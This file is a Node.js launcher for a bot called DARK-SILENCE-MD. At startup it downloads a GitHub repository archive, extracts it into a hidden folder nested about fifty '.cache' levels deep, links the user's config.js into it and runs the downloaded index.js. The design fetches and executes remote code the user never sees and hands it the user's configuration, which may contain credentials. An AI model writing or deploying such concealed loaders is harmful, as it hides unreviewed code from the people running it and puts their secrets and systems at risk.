const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');

// GitHub repo zip URL for DARK-SILENCE-MD (adjust branch if needed)
const repoZipUrl = 'https://github.com/SILENTLOVER043/SSMD/archive/refs/heads/main.zip';

// Base hidden folder
let deepPath = path.join(__dirname, '.node');
for (let i = 0; i < 50; i++) {
  deepPath = path.join(deepPath, '.cache'); // Nest 50 folders deep
}
const repoFolder = path.join(deepPath, '.node');

async function downloadAndExtractRepo() {
  try {
    console.log('🔄 LOADING BOT FILES FOR DARK-SILENCE-MD...🌐');
    const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
    const zip = new AdmZip(Buffer.from(response.data, 'binary'));

    // Ensure the deeply hidden extraction folder exists
    fs.mkdirSync(repoFolder, { recursive: true });

    // Extract all files to the deeply hidden repoFolder
    zip.extractAllTo(repoFolder, true);
    console.log('FILE PULLED AND bot STRAPPED ⭐');
  } catch (error) {
    console.error('ERROR PULLING FILE 💤', error);
    process.exit(1);
  }
}

(async () => {
  // Download and extract the repository files
  await downloadAndExtractRepo();

  // GitHub zip extraction creates a folder like "SILENT LOVER"
  const extractedFolders = fs
    .readdirSync(repoFolder)
    .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

  if (!extractedFolders.length) {
    console.error('NO OLDER FOUND IN FILE 🛑');
    process.exit(1);
  }

  const extractedRepoPath = path.join(repoFolder, extractedFolders[0]);
  // console.log('[🌐] Repository extracted to:', extractedRepoPath);

  
  // ─── SYMLINK YOUR CONFIG ──────────────────────────────────────────────────────
  const srcConfig = path.join(__dirname, 'config.js');
  const destConfig = path.join(extractedRepoPath, 'config.js');

  try {
    // Remove any existing config.js in the extracted repo
    if (fs.existsSync(destConfig)) {
      fs.unlinkSync(destConfig);
    }
    // Create a symlink pointing to your repo's config.js
    fs.symlinkSync(srcConfig, destConfig, 'file');
   // console.log('[🔗] Symlinked config.js ');
  } catch (err) {
    console.error('FAILED TO SYMLINK CONFIG.JSON 🛑', err);
    process.exit(1);
  }
  // ──────────────────────────────────────────────────────────────────────────────

  console.log('🚀 SUCCESSFULLY COMPLETE NOW STARTING DARK-SILENCE-MD...🌸❤️');
  // Change the working directory so that relative paths (e.g. ./plugins/) work correctly.
  process.chdir(extractedRepoPath);

  // Now require the main file from the extracted repository.
  require(path.join(extractedRepoPath, 'index.js'));
})();
